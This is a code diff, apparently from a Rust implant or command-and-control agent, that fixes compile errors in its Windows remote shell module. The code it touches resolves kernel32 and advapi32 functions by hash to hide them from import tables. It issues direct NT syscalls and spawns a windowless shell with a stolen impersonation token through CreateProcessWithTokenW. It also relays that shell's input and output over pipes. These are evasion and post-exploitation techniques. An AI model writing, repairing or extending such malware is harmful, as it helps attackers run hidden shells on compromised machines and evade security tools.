@@ -101,6 +101,9 @@ struct PlatformProcess {
     pid: u32,
 }
 
+#[cfg(windows)]
+unsafe impl Send for PlatformProcess {}
+
 #[cfg(unix)]
 struct PlatformProcess {
     pid: i32,
@@ -118,6 +121,9 @@ struct PlatformPipes {
     stdout_read: winapi::shared::ntdef::HANDLE,
     stderr_read: winapi::shared::ntdef::HANDLE,
 }
+
+#[cfg(windows)]
+unsafe impl Send for PlatformPipes {}
 
 #[cfg(unix)]
 struct PlatformPipes {
@@ -376,27 +382,27 @@ fn spawn_shell_process(
     use winapi::um::winnt::HANDLE;
 
     // Dynamically resolve kernel32 functions to avoid IAT entries.
-    let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+    let k32 = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) }
         .ok_or_else(|| "could not resolve kernel32 base".to_string())?;
 
     // CreatePipe — used for stdin/stdout/stderr pipes
-    let create_pipe_addr = pe_resolve::get_proc_address_by_hash(
+    let create_pipe_addr = unsafe { pe_resolve::get_proc_address_by_hash(
         k32,
         pe_resolve::hash_str(b"CreatePipe\0"),
-    ).ok_or_else(|| "could not resolve CreatePipe".to_string())?;
+    ) }.ok_or_else(|| "could not resolve CreatePipe".to_string())?;
     type CreatePipeFn = unsafe extern "system" fn(
         *mut winapi::shared::ntdef::HANDLE,  // hReadPipe
         *mut winapi::shared::ntdef::HANDLE,  // hWritePipe
         *mut winapi::um::minwinbase::SECURITY_ATTRIBUTES, // lpPipeAttributes
         DWORD,                               // nSize
     ) -> i32; // BOOL
-    let create_pipe: CreatePipeFn = std::mem::transmute(create_pipe_addr);
+    let create_pipe: CreatePipeFn = unsafe { std::mem::transmute(create_pipe_addr) };
 
     // CreateProcessW — used to spawn the shell process
-    let create_process_w_addr = pe_resolve::get_proc_address_by_hash(
+    let create_process_w_addr = unsafe { pe_resolve::get_proc_address_by_hash(
         k32,
         pe_resolve::hash_str(b"CreateProcessW\0"),
-    ).ok_or_else(|| "could not resolve CreateProcessW".to_string())?;
+    ) }.ok_or_else(|| "could not resolve CreateProcessW".to_string())?;
     type CreateProcessWFn = unsafe extern "system" fn(
         *mut u16,                 // lpApplicationName
         *mut u16,                 // lpCommandLine
@@ -409,12 +415,12 @@ fn spawn_shell_process(
         *mut STARTUPINFOW,        // lpStartupInfo
         *mut PROCESS_INFORMATION, // lpProcessInformation
     ) -> i32; // BOOL
-    let create_process_w: CreateProcessWFn = std::mem::transmute(create_process_w_addr);
+    let create_process_w: CreateProcessWFn = unsafe { std::mem::transmute(create_process_w_addr) };
 
     // CreateProcessWithTokenW — from advapi32 (no pre-computed hash)
-    let advapi32 = pe_resolve::get_module_handle_by_hash(
+    let advapi32 = unsafe { pe_resolve::get_module_handle_by_hash(
         pe_resolve::hash_str(b"advapi32.dll\0")
-    ).unwrap_or(std::ptr::null_mut());
+    ) }.unwrap_or(0);
     let create_process_with_token_w: Option<unsafe extern "system" fn(
         *mut c_void,              // hToken
         u32,                      // dwLogonFlags
@@ -425,13 +431,13 @@ fn spawn_shell_process(
         *mut u16,                 // lpCurrentDirectory
         *mut STARTUPINFOW,        // lpStartupInfo
         *mut PROCESS_INFORMATION, // lpProcessInformation
-    ) -> i32> = if advapi32.is_null() {
+    ) -> i32> = if advapi32 == 0 {
         None
     } else {
-        pe_resolve::get_proc_address_by_hash(
+        unsafe { pe_resolve::get_proc_address_by_hash(
             advapi32,
             pe_resolve::hash_str(b"CreateProcessWithTokenW\0"),
-        ).map(|addr| std::mem::transmute(addr))
+        ) }.map(|addr| unsafe { std::mem::transmute(addr) })
     };
 
     use std::ffi::OsStr;
@@ -445,7 +451,7 @@ fn spawn_shell_process(
     let mut stderr_read: HANDLE = std::ptr::null_mut();
     let mut stderr_write: HANDLE = std::ptr::null_mut();
 
-    let mut sa: winapi::um::minwinbase::SECURITY_ATTRIBUTES = std::mem::zeroed();
+    let mut sa: winapi::um::minwinbase::SECURITY_ATTRIBUTES = unsafe { std::mem::zeroed() };
     sa.nLength = std::mem::size_of::<winapi::um::minwinbase::SECURITY_ATTRIBUTES>() as DWORD;
     sa.bInheritHandle = TRUE;
     sa.lpSecurityDescriptor = std::ptr::null_mut();
@@ -455,15 +461,15 @@ fn spawn_shell_process(
             return Err("CreatePipe(stdin) failed".to_string());
         }
         if create_pipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
-            let _ = syscall!("NtClose", stdin_read as u64);
-            let _ = syscall!("NtClose", stdin_write as u64);
+            let _ = crate::syscall!("NtClose", stdin_read as u64);
+            let _ = crate::syscall!("NtClose", stdin_write as u64);
             return Err("CreatePipe(stdout) failed".to_string());
         }
         if create_pipe(&mut stderr_read, &mut stderr_write, &mut sa, 0) == 0 {
-            let _ = syscall!("NtClose", stdin_read as u64);
-            let _ = syscall!("NtClose", stdin_write as u64);
-            let _ = syscall!("NtClose", stdout_read as u64);
-            let _ = syscall!("NtClose", stdout_write as u64);
+            let _ = crate::syscall!("NtClose", stdin_read as u64);
+            let _ = crate::syscall!("NtClose", stdin_write as u64);
+            let _ = crate::syscall!("NtClose", stdout_read as u64);
+            let _ = crate::syscall!("NtClose", stdout_write as u64);
             return Err("CreatePipe(stderr) failed".to_string());
         }
 
@@ -475,19 +481,19 @@ fn spawn_shell_process(
             protect_from_close: u8,
         }
         let flag_off = ObjHandleFlagInfo { inherit: 0, protect_from_close: 0 };
-        let _ = syscall!(
+        let _ = crate::syscall!(
             "NtSetInformationObject",
             stdin_write as u64, 4u64,
             &flag_off as *const _ as u64,
             std::mem::size_of::<ObjHandleFlagInfo>() as u64,
         );
-        let _ = syscall!(
+        let _ = crate::syscall!(
             "NtSetInformationObject",
             stdout_read as u64, 4u64,
             &flag_off as *const _ as u64,
             std::mem::size_of::<ObjHandleFlagInfo>() as u64,
         );
-        let _ = syscall!(
+        let _ = crate::syscall!(
             "NtSetInformationObject",
             stderr_read as u64, 4u64,
             &flag_off as *const _ as u64,
@@ -501,31 +507,31 @@ fn spawn_shell_process(
         .chain(std::iter::once(0))
         .collect();
 
-    let mut startup_info: STARTUPINFOW = std::mem::zeroed();
+    let mut startup_info: STARTUPINFOW = unsafe { std::mem::zeroed() };
     startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as DWORD;
     startup_info.dwFlags = STARTF_USESTDHANDLES;
     startup_info.hStdInput = stdin_read;
     startup_info.hStdOutput = stdout_write;
     startup_info.hStdError = stderr_write;
 
-    let mut proc_info: PROCESS_INFORMATION = std::mem::zeroed();
+    let mut proc_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
 
     // Check if we have an impersonation token.
     let current_token = crate::token_manipulation::get_current_token();
     let creation_result = if !current_token.is_null() && create_process_with_token_w.is_some() {
         // Use CreateProcessWithTokenW to inherit the impersonation token.
-        use winapi::um::winnt::LOGON_WITH_PROFILE;
+        use winapi::um::winbase::LOGON_WITH_PROFILE;
         let cpwtw = create_process_with_token_w.unwrap();
 
         let result = unsafe {
             cpwtw(
                 current_token as *mut c_void,
                 LOGON_WITH_PROFILE,
-                std::ptr::null(),
+                std::ptr::null_mut(),
                 wide.as_ptr() as *mut u16,
                 0, // dwCreationFlags
                 std::ptr::null_mut(),
-                std::ptr::null(),
+                std::ptr::null_mut(),
                 &mut startup_info,
                 &mut proc_info,
             )
@@ -539,14 +545,14 @@ fn spawn_shell_process(
             // Fall back to CreateProcessW.
             let result = unsafe {
                 create_process_w(
-                    std::ptr::null(),
+                    std::ptr::null_mut(),
                     wide.as_ptr() as *mut u16,
                     std::ptr::null_mut(),
                     std::ptr::null_mut(),
                     TRUE,
                     CREATE_NO_WINDOW,
                     std::ptr::null_mut(),
-                    std::ptr::null(),
+                    std::ptr::null_mut(),
                     &mut startup_info,
                     &mut proc_info,
                 )
@@ -564,14 +570,14 @@ fn spawn_shell_process(
         // No impersonation token — use CreateProcessW directly.
         let result = unsafe {
             create_process_w(
-                std::ptr::null(),
+                std::ptr::null_mut(),
                 wide.as_ptr() as *mut u16,
                 std::ptr::null_mut(),
                 std::ptr::null_mut(),
                 TRUE,
                 CREATE_NO_WINDOW,
                 std::ptr::null_mut(),
-                std::ptr::null(),
+                std::ptr::null_mut(),
                 &mut startup_info,
                 &mut proc_info,
             )
@@ -591,11 +597,11 @@ fn spawn_shell_process(
 
     // Close the child-side pipe handles (the child inherited them).
     unsafe {
-        let _ = syscall!("NtClose", stdin_read as u64);
-        let _ = syscall!("NtClose", stdout_write as u64);
-        let _ = syscall!("NtClose", stderr_write as u64);
+        let _ = crate::syscall!("NtClose", stdin_read as u64);
+        let _ = crate::syscall!("NtClose", stdout_write as u64);
+        let _ = crate::syscall!("NtClose", stderr_write as u64);
         // Close the thread handle (we keep the process handle for reference).
-        let _ = syscall!("NtClose", proc_info.hThread as u64);
+        let _ = crate::syscall!("NtClose", proc_info.hThread as u64);
     }
 
     // GetProcessId → NtQueryInformationProcess(ProcessBasicInformation)
@@ -607,9 +613,9 @@ fn spawn_shell_process(
         unique_process_id: usize,
         inherited_from_unique_process_id: usize,
     }
-    let mut pbi: Pbi = std::mem::zeroed();
+    let mut pbi: Pbi = unsafe { std::mem::zeroed() };
     let _ = unsafe {
-        syscall!(
+        crate::syscall!(
             "NtQueryInformationProcess",
             proc_info.hProcess as u64,
             0u64, // ProcessBasicInformation
@@ -643,24 +649,24 @@ fn close_all_handles(
     f: winapi::shared::ntdef::HANDLE,
 ) {
     unsafe {
-        let _ = syscall!("NtClose", a as u64);
-        let _ = syscall!("NtClose", b as u64);
-        let _ = syscall!("NtClose", c as u64);
-        let _ = syscall!("NtClose", d as u64);
-        let _ = syscall!("NtClose", e as u64);
-        let _ = syscall!("NtClose", f as u64);
+        let _ = crate::syscall!("NtClose", a as u64);
+        let _ = crate::syscall!("NtClose", b as u64);
+        let _ = crate::syscall!("NtClose", c as u64);
+        let _ = crate::syscall!("NtClose", d as u64);
+        let _ = crate::syscall!("NtClose", e as u64);
+        let _ = crate::syscall!("NtClose", f as u64);
     }
 }
 
 #[cfg(windows)]
 fn write_to_pipe(pipes: &PlatformPipes, data: &[u8]) -> Result<(), String> {
     // Dynamically resolve WriteFile from kernel32 to avoid IAT entry.
-    let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+    let k32 = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) }
         .ok_or_else(|| "could not resolve kernel32 base".to_string())?;
-    let write_file_addr = pe_resolve::get_proc_address_by_hash(
-        k32,
-        pe_resolve::hash_str(b"WriteFile\0"),
-    ).ok_or_else(|| "could not resolve WriteFile".to_string())?;
+    let write_file_addr = unsafe {
+        pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"WriteFile\0"))
+    }
+    .ok_or_else(|| "could not resolve WriteFile".to_string())?;
     type WriteFileFn = unsafe extern "system" fn(
         winapi::shared::ntdef::HANDLE, // hFile
         *const c_void,                 // lpBuffer
@@ -668,7 +674,7 @@ fn write_to_pipe(pipes: &PlatformPipes, data: &[u8]) -> Result<(), String> {
         *mut u32,                      // lpNumberOfBytesWritten
         *mut c_void,                   // lpOverlapped
     ) -> i32; // BOOL
-    let write_file: WriteFileFn = std::mem::transmute(write_file_addr);
+    let write_file: WriteFileFn = unsafe { std::mem::transmute(write_file_addr) };
 
     let mut written: u32 = 0;
     let result = unsafe {
@@ -693,11 +699,10 @@ fn read_from_pipe(handle: winapi::shared::ntdef::HANDLE) -> Option<Vec<u8>> {
     use winapi::shared::minwindef::DWORD;
 
     // Dynamically resolve PeekNamedPipe and ReadFile from kernel32 to avoid IAT entries.
-    let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
-    let peek_named_pipe_addr = pe_resolve::get_proc_address_by_hash(
-        k32,
-        pe_resolve::hash_str(b"PeekNamedPipe\0"),
-    )?;
+    let k32 = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) }?;
+    let peek_named_pipe_addr = unsafe {
+        pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"PeekNamedPipe\0"))
+    }?;
     type PeekNamedPipeFn = unsafe extern "system" fn(
         winapi::shared::ntdef::HANDLE, // hNamedPipe
         *mut c_void,                   // lpBuffer
@@ -706,12 +711,11 @@ fn read_from_pipe(handle: winapi::shared::ntdef::HANDLE) -> Option<Vec<u8>> {
         *mut u32,                      // lpTotalBytesAvail
         *mut u32,                      // lpBytesLeftThisMessage
     ) -> i32; // BOOL
-    let peek_named_pipe: PeekNamedPipeFn = std::mem::transmute(peek_named_pipe_addr);
+    let peek_named_pipe: PeekNamedPipeFn = unsafe { std::mem::transmute(peek_named_pipe_addr) };
 
-    let read_file_addr = pe_resolve::get_proc_address_by_hash(
-        k32,
-        pe_resolve::hash_str(b"ReadFile\0"),
-    )?;
+    let read_file_addr = unsafe {
+        pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"ReadFile\0"))
+    }?;
     type ReadFileFn = unsafe extern "system" fn(
         winapi::shared::ntdef::HANDLE, // hFile
         *mut c_void,                   // lpBuffer
@@ -719,7 +723,7 @@ fn read_from_pipe(handle: winapi::shared::ntdef::HANDLE) -> Option<Vec<u8>> {
         *mut u32,                      // lpNumberOfBytesRead
         *mut c_void,                   // lpOverlapped
     ) -> i32; // BOOL
-    let read_file: ReadFileFn = std::mem::transmute(read_file_addr);
+    let read_file: ReadFileFn = unsafe { std::mem::transmute(read_file_addr) };
 
     unsafe {
         let mut bytes_avail: DWORD = 0;
@@ -760,7 +764,7 @@ fn read_from_pipe(handle: winapi::shared::ntdef::HANDLE) -> Option<Vec<u8>> {
 #[cfg(windows)]
 fn terminate_process(process: &PlatformProcess) {
     unsafe {
-        let _ = syscall!(
+        let _ = crate::syscall!(
             "NtTerminateProcess",
             process.handle as u64,
             1u64, // ExitStatus
@@ -771,9 +775,9 @@ fn terminate_process(process: &PlatformProcess) {
 #[cfg(windows)]
 fn close_pipes(pipes: &PlatformPipes) {
     unsafe {
-        let _ = syscall!("NtClose", pipes.stdin_write as u64);
-        let _ = syscall!("NtClose", pipes.stdout_read as u64);
-        let _ = syscall!("NtClose", pipes.stderr_read as u64);
+        let _ = crate::syscall!("NtClose", pipes.stdin_write as u64);
+        let _ = crate::syscall!("NtClose", pipes.stdout_read as u64);
+        let _ = crate::syscall!("NtClose", pipes.stderr_read as u64);
     }
 }
 
@@ -782,8 +786,8 @@ fn is_process_alive(process: &PlatformProcess) -> bool {
     unsafe {
         // NtWaitForSingleObject with timeout=0 (non-blocking).
         // Timeout of 0 means return immediately.
-        let timeout: i64 = 0; // Non-blocking: return immediately with current state
-        let status = syscall!(
+        let mut timeout: i64 = 0; // Non-blocking: return immediately with current state
+        let status = crate::syscall!(
             "NtWaitForSingleObject",
             process.handle as u64,  // Handle
             0u64,                    // Alertable = FALSE
@@ -1044,9 +1048,9 @@ fn spawn_readers(
     child_process: PlatformProcess,
 ) -> std::thread::JoinHandle<()> {
     #[cfg(windows)]
-    let stdout_handle = pipes.stdout_read;
+    let stdout_handle = pipes.stdout_read as usize;
     #[cfg(windows)]
-    let stderr_handle = pipes.stderr_read;
+    let stderr_handle = pipes.stderr_read as usize;
 
     #[cfg(unix)]
     let master_fd = pipes.master_fd;
@@ -1082,7 +1086,7 @@ fn spawn_readers(
                     let stdout_data = {
                         #[cfg(windows)]
                         {
-                            read_from_pipe(stdout_handle)
+                            read_from_pipe(stdout_handle as winapi::shared::ntdef::HANDLE)
                         }
                         #[cfg(unix)]
                         {
@@ -1104,7 +1108,7 @@ fn spawn_readers(
                     // Read from stderr (Windows only — PTY merges into master_fd on Unix).
                     #[cfg(windows)]
                     {
-                        let stderr_data = read_from_pipe(stderr_handle);
+                        let stderr_data = read_from_pipe(stderr_handle as winapi::shared::ntdef::HANDLE);
 
                         if let Some(data) = stderr_data {
                             let text = String::from_utf8_lossy(&data).to_string();
